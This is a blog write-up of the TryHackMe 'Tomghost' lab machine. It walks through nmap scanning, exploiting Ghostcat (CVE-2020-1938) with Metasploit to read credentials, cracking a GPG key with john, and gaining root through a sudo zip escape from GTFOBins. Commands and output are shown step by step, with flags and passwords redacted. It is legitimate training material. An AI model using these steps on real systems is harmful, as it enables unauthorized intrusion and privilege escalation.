<!doctype html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="Tomghost" /><meta property="og:locale" content="en" /><meta name="description" content="Tomghost is a linux machine which is rated easy by TryHackMe. This machine covers vulnerability on the Tomcat apache server and privilege escalation on a different user on the box. I’ll have to remove the flags and passwords…" /><meta property="og:description" content="Tomghost is a linux machine which is rated easy by TryHackMe. This machine covers vulnerability on the Tomcat apache server and privilege escalation on a different user on the box. I’ll have to remove the flags and passwords…" /><link rel="canonical" href="https://yrncollo.com/posts/tomghost/" /><meta property="og:url" content="https://yrncollo.com/posts/tomghost/" /><meta property="og:site_name" content="YrnCollo" /><meta property="og:image" content="https://yrncollo.com/assets/img/Posts/tomghost/banner.png" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2023-04-20T00:00:00+03:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://yrncollo.com/assets/img/Posts/tomghost/banner.png" /><meta property="twitter:title" content="Tomghost" /><meta name="twitter:site" content="@Yrn_Collo" /><meta name="google-site-verification" content="s2kaFALVZKH6rK2aLGiR6DEh3EnEXU1S0aw8IWg6BuA" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-04-20T00:00:00+03:00","datePublished":"2023-04-20T00:00:00+03:00","description":"Tomghost is a linux machine which is rated easy by TryHackMe. This machine covers vulnerability on the Tomcat apache server and privilege escalation on a different user on the box. I’ll have to remove the flags and passwords…","headline":"Tomghost","image":"https://yrncollo.com/assets/img/Posts/tomghost/banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"https://yrncollo.com/posts/tomghost/"},"url":"https://yrncollo.com/posts/tomghost/"}</script><title>Tomghost | YrnCollo</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="YrnCollo"><meta name="application-name" content="YrnCollo"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.4.0/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.21.0/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"><body><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"> <img src="/assets/img/favicons/profile.jpeg" width="112" height="112" alt="avatar" onerror="this.style.display='none'"> </a><div class="site-title"> <a href="/">YrnCollo</a></div><div class="site-subtitle fst-italic">Cybersecurity researcher || CTF player || Red teamer || Reverse Engineer</div></div><ul class="nav flex-column flex-grow-1 w-100 ps-0"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/yrncollo" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/Yrn_Collo" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fab fa-twitter"></i> </a> <a href="https://infosec.exchange/@yrncollo" aria-label="mastodon" target="_blank" rel="noopener noreferrer me" > <i class="fab fa-mastodon"></i> </a> <a href="https://www.linkedin.com/in/collins-ngeno/" aria-label="linkedin" target="_blank" rel="noopener noreferrer" > <i class="fab fa-linkedin"></i> </a> <a href="https://stackoverflow.com/users/20314539/yrncollo" aria-label="stack-overflow" target="_blank" rel="noopener noreferrer" > <i class="fab fa-stack-overflow"></i> </a></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container px-xxl-5"><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100" > <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Tomghost</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </span> <span id="search-cancel">Cancel</span></div></div><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pe-xl-4"><div class="post px-1 px-md-2"><h1 data-toc-skip>Tomghost</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1681938000" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Apr 20, 2023 </em> </span><div class="mt-3 mb-3"> <a href="/assets/img/Posts/tomghost/banner.png" class="popup img-link preview-img shimmer"><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1200 630'%3E%3C/svg%3E" data-src="/assets/img/Posts/tomghost/banner.png" alt="Preview Image" width="1200" height="630" class="lazyload" data-proofer-ignore></a></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/Yrn_Collo">Collins Ng'eno</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="1147 words" > <em>6 min</em> read</span></div></div></div><div class="post-content"><blockquote class="prompt-tip"><p><a href="https://tryhackme.com/room/tomghost">Tomghost</a> is a linux machine which is rated easy by TryHackMe. This machine covers vulnerability on the Tomcat apache server and privilege escalation on a different user on the box. I’ll have to remove the flags and passwords…</p></blockquote><h2 id="network-scanning"><span class="me-2">Network scanning</span><a href="#network-scanning" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>The machine IP address is <code class="language-plaintext highlighter-rouge">10.10.68.255</code> and we shall start by scanning it by using <code class="language-plaintext highlighter-rouge">nmap</code>.</p><p>Command: <code class="language-plaintext highlighter-rouge">nmap -sC -sV -oA initial 10.10.68.255</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> initial 10.10.68.255 
Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-04-20 11:58 EAT
Nmap scan report <span class="k">for </span>10.10.68.255
Host is up <span class="o">(</span>0.17s latency<span class="o">)</span><span class="nb">.</span>
Not shown: 996 closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 f3c89f0b6ac5fe95540be9e3ba93db7c <span class="o">(</span>RSA<span class="o">)</span>
|   256 dd1a09f59963a3430d2d90d8e3e11fb9 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 48d1301b386cc653ea3081805d0cf105 <span class="o">(</span>ED25519<span class="o">)</span>
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv <span class="o">(</span>Protocol v1.3<span class="o">)</span>
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>120.12 seconds
</pre></table></code></div></div><h2 id="enumeration"><span class="me-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>There is a website running on port 8080. We notice it is <code class="language-plaintext highlighter-rouge">Apache Tomcat</code> version <code class="language-plaintext highlighter-rouge">9.0.30</code>. If we google some of the vulnerabilities which affected that version we get <code class="language-plaintext highlighter-rouge">File upload vulnerability</code> <a href="https://www.exploit-db.com/exploits/49039">CVE-2020-1938</a>. Now lets launch <code class="language-plaintext highlighter-rouge">Metaslpoit</code> and search it.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>msf6 <span class="o">&gt;</span> search CVE-2020-1938

Matching Modules
<span class="o">================</span>

   <span class="c">#  Name                                  Disclosure Date  Rank    Check  Description</span>
   -  <span class="nt">----</span>                                  <span class="nt">---------------</span>  <span class="nt">----</span>    <span class="nt">-----</span>  <span class="nt">-----------</span>
   0  auxiliary/admin/http/tomcat_ghostcat  2020-02-20       normal  Yes    Apache Tomcat AJP File Read


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/admin/http/tomcat_ghostcat
</pre></table></code></div></div><p>Use the exploit which we have found.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>use auxiliary/admin/http/tomcat_ghostcat
</pre></table></code></div></div><p>Then set the RHOSTS to our machine’s IP address.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>msf6 auxiliary<span class="o">(</span>admin/http/tomcat_ghostcat<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhosts 10.10.68.255
rhosts <span class="o">=&gt;</span> 10.10.68.255
</pre></table></code></div></div><p>Once you have set the <code class="language-plaintext highlighter-rouge">rhosts</code> you can now <code class="language-plaintext highlighter-rouge">exploit</code> the system by using <code class="language-plaintext highlighter-rouge">run</code> or <code class="language-plaintext highlighter-rouge">exploit</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
</pre><td class="rouge-code"><pre>msf6 auxiliary<span class="o">(</span>admin/http/tomcat_ghostcat<span class="o">)</span> <span class="o">&gt;</span> run
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Running module against 10.10.68.255
Status Code: 200
Accept-Ranges: bytes
ETag: W/<span class="s2">"1261-1583902632000"</span>
Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT
Content-Type: application/xml
Content-Length: 1261
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span>?&gt;
&lt;<span class="o">!</span><span class="nt">--</span>
 Licensed to the Apache Software Foundation <span class="o">(</span>ASF<span class="o">)</span> under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work <span class="k">for </span>additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  <span class="o">(</span>the <span class="s2">"License"</span><span class="o">)</span><span class="p">;</span> you may not use this file except <span class="k">in </span>compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to <span class="k">in </span>writing, software
  distributed under the License is distributed on an <span class="s2">"AS IS"</span> BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License <span class="k">for </span>the specific language governing permissions and
  limitations under the License.
<span class="nt">--</span><span class="o">&gt;</span>
&lt;web-app <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://xmlns.jcp.org/xml/ns/javaee"</span>
  xmlns:xsi<span class="o">=</span><span class="s2">"http://www.w3.org/2001/XMLSchema-instance"</span>
  xsi:schemaLocation<span class="o">=</span><span class="s2">"http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span>
  <span class="nv">version</span><span class="o">=</span><span class="s2">"4.0"</span>
  metadata-complete<span class="o">=</span><span class="s2">"true"</span><span class="o">&gt;</span>

  &lt;display-name&gt;Welcome to Tomcat&lt;/display-name&gt;
  &lt;description&gt;
     Welcome to GhostCat
	skyfuck:I_HAVE_REMOVED_THE_PASSWORD
  &lt;/description&gt;

&lt;/web-app&gt;
msf6 auxiliary<span class="o">(</span>admin/http/tomcat_ghostcat<span class="o">)</span> <span class="o">&gt;</span>
</pre></table></code></div></div><p>You will find the username and the password on the <code class="language-plaintext highlighter-rouge">description tag</code>. You can also find this file here: <code class="language-plaintext highlighter-rouge">/home/{YOUR_USERNAME}/.msf4/loot/20230420121725_default_10.10.68.255_WEBINFweb.xml_167447.txt</code></p><h2 id="initial-foothold"><span class="me-2">Initial Foothold</span><a href="#initial-foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Since we have the username and password we can <code class="language-plaintext highlighter-rouge">ssh</code> into the machine.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>ssh skyfuck@10.10.68.255
</pre></table></code></div></div><p>lets cat the user flag</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>skyfuck@ubuntu:~<span class="nv">$ </span><span class="nb">cat</span> /home/merlin/user.txt 
THM<span class="o">{</span>I_HAVE_REMOVED_THE_FLAG<span class="o">}</span>
</pre></table></code></div></div><p>If we go to the <code class="language-plaintext highlighter-rouge">home</code> directory, we find two files:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>skyfuck@ubuntu:~<span class="nv">$ </span><span class="nb">ls
</span>credential.pgp  tryhackme.asc
</pre></table></code></div></div><p>Lets copy the files to our machine so as we can crack the <code class="language-plaintext highlighter-rouge">credential.gpg</code></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>scp skyfuck@10.10.68.255:/home/skyfuck/<span class="k">*</span> <span class="nb">.</span>
skyfuck@10.10.68.255<span class="s1">'s password: 
credential.pgp                                    100%  394     0.9KB/s   00:00    
tryhackme.asc
</span></pre></table></code></div></div><p>We shall use <code class="language-plaintext highlighter-rouge">John</code> to crack the password meaning we have to use <code class="language-plaintext highlighter-rouge">gpg2john</code> so as we have it’s hash to crack it.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>gpg2john tryhackme.asc <span class="o">&gt;</span> <span class="nb">hash</span>
</pre></table></code></div></div><p>Now fire up john and let it do its thing.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt <span class="nb">hash 
</span>Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>gpg, OpenPGP / GnuPG Secret Key <span class="o">[</span>32/64]<span class="o">)</span>
Cost 1 <span class="o">(</span>s2k-count<span class="o">)</span> is 65536 <span class="k">for </span>all loaded hashes
Cost 2 <span class="o">(</span><span class="nb">hash </span>algorithm <span class="o">[</span>1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]<span class="o">)</span> is 2 <span class="k">for </span>all loaded hashes
Cost 3 <span class="o">(</span>cipher algorithm <span class="o">[</span>1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]<span class="o">)</span> is 9 <span class="k">for </span>all loaded hashes
Will run 4 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
I_HAVE_REMOVED_THE_PASSWORD        <span class="o">(</span>tryhackme<span class="o">)</span>     
1g 0:00:00:00 DONE <span class="o">(</span>2023-04-20 12:37<span class="o">)</span> 1.923g/s 2061p/s 2061c/s 2061C/s theresa..alexandru
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed.
</pre></table></code></div></div><p>Nice… We have the password of the <code class="language-plaintext highlighter-rouge">gpg</code> file so lets first import it.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>skyfuck@ubuntu:~<span class="nv">$ </span>gpg <span class="nt">--import</span> tryhackme.asc 
gpg: key C6707170: secret key imported
gpg: /home/skyfuck/.gnupg/trustdb.gpg: trustdb created
gpg: key C6707170: public key <span class="s2">"tryhackme &lt;stuxnet@tryhackme.com&gt;"</span> imported
gpg: key C6707170: <span class="s2">"tryhackme &lt;stuxnet@tryhackme.com&gt;"</span> not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys <span class="nb">read</span>: 1
gpg:   secret keys imported: 1
</pre></table></code></div></div><p>Once we have imported it we are going to decrypt the gpg.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>skyfuck@ubuntu:~<span class="nv">$ </span>gpg <span class="nt">--decrypt</span> credential.pgp 

You need a passphrase to unlock the secret key <span class="k">for
</span>user: <span class="s2">"tryhackme &lt;stuxnet@tryhackme.com&gt;"</span>
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 <span class="o">(</span>main key ID C6707170<span class="o">)</span>

gpg: gpg-agent is not available <span class="k">in </span>this session
gpg: WARNING: cipher algorithm CAST5 not found <span class="k">in </span>recipient preferences
gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
      <span class="s2">"tryhackme &lt;stuxnet@tryhackme.com&gt;"</span>
merlin:I_HAVE_REMOVED_THE_PASSWORD
skyfuck@ubuntu:~<span class="err">$</span>
</pre></table></code></div></div><p>Wooah… We have found another user and the password.</p><h2 id="privilege-escalation"><span class="me-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Lets login in his account and find our way to being the root.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>└─<span class="nv">$ </span>ssh merlin@10.10.68.255
merlin@10.10.68.255<span class="s1">'s password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)
</span></pre></table></code></div></div><p>By running <code class="language-plaintext highlighter-rouge">sudo -l</code> we see that the <code class="language-plaintext highlighter-rouge">/usr/bin/zip</code> can be ran by this user with root privilege.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>merlin@ubuntu:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>merlin on ubuntu:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User merlin may run the following commands on ubuntu:
    <span class="o">(</span>root : root<span class="o">)</span> NOPASSWD: /usr/bin/zip
merlin@ubuntu:~<span class="err">$</span>
</pre></table></code></div></div><p>So lets go to <code class="language-plaintext highlighter-rouge">gtfobins</code> and find our payload to use. <a href="https://gtfobins.github.io/gtfobins/zip/#sudo">Link</a></p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>merlin@ubuntu:~<span class="nv">$ TF</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-u</span><span class="si">)</span>
merlin@ubuntu:~<span class="nv">$ </span><span class="nb">sudo </span>zip <span class="nv">$TF</span> /etc/hosts <span class="nt">-T</span> <span class="nt">-TT</span> <span class="s1">'sh #'</span>
  adding: etc/hosts <span class="o">(</span>deflated 31%<span class="o">)</span>
<span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
<span class="c">#</span>
</pre></table></code></div></div><p>We have root soo lets get our flag and get out of here.</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="c"># cat /root/root.txt</span>
THM<span class="o">{</span>I_HAVE_REMOVED_THE_FLAG<span class="o">}</span>
<span class="c">#</span>
</pre></table></code></div></div><blockquote class="prompt-warning"><p>If you have any other additional information and resources you can add it at the comment section. <strong>THANKS ;)</strong></p></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href='/categories/tryhackme/'>Tryhackme</a>, <a href='/categories/easy/'>Easy</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/nmap/" class="post-tag no-text-decoration" >nmap</a> <a href="/tags/metaslpoit/" class="post-tag no-text-decoration" >metaslpoit</a> <a href="/tags/ssh/" class="post-tag no-text-decoration" >ssh</a> <a href="/tags/gpg/" class="post-tag no-text-decoration" >gpg</a> <a href="/tags/john/" class="post-tag no-text-decoration" >john</a> <a href="/tags/gtfobins/" class="post-tag no-text-decoration" >gtfobins</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted me-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Tomghost%20-%20YrnCollo&url=https%3A%2F%2Fyrncollo.com%2Fposts%2Ftomghost%2F" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter" > <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fyrncollo.com%2Fposts%2Ftomghost%2F&text=Tomghost%20-%20YrnCollo" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram" > <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fyrncollo.com%2Fposts%2Ftomghost%2F" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin" > <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/CyberTalents_Bootcamp/">CyberTalents Bootcamp 2022</a><li class="text-truncate lh-lg"> <a href="/posts/Vim/">VIM</a><li class="text-truncate lh-lg"> <a href="/posts/you-cant-c-me/">You Can't see me</a><li class="text-truncate lh-lg"> <a href="/posts/LazyAdmin/">LazyAdmin</a><li class="text-truncate lh-lg"> <a 